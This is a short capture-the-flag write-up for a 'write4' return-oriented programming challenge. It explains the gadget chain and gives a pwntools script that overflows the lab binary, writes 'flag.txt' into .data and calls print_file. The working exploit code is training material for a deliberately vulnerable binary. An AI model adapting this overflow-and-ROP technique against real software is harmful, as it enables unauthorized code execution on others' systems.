# Challenge Theory
This is a rop challenge where the attacker has to write a string to memory in order to make the win function work. 
The win function simply reads out a file's contents, but does so with an argument.
# Solution
The attacker has to supply an argument to the function, which is actually a string.
This will be the file the print function actually reads from.
The rop chain would like:
```
pop r14, r15
mov [r14], r15
pop .data into rdi
call print_file
```
## Solution Source Code
```python
#!/usr/bin/python3
import pwn
import sys
binary = "write4"
pwn.context.binary = binary
pwn.context.encoding = "latin"

''' new exploit
put the values of .data start and flag.txt on the stack
pop r14, r15
mov [r14], r15
pop .data into rdi
call print_file
'''
write_location = pwn.p64(0x601028)
write_flag = b"flag.txt"
gadget_pop_r14_r15 = pwn.p64(0x400690)
gadget_mov_r14_r15 = pwn.p64(0x400628)
gadget_pop_rdi = pwn.p64(0x400693)
gadget_print_file = pwn.p64(0x400510)

padding = 40 
payload = b"A"*padding + gadget_pop_r14_r15 + write_location + write_flag + gadget_mov_r14_r15 + gadget_pop_rdi + write_location + gadget_print_file

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```